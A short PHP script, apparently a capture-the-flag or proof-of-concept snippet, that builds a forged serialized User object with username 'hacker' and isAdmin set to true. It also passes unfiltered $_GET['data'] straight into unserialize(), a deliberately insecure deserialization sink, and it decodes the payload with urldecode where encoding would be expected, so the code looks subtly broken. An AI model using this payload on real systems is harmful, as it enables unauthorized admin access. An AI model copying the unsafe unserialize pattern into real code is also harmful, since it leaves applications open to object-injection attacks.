<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}
$data = unserialize($_GET['data']);
echo urldecode(serialize(new User()))
?>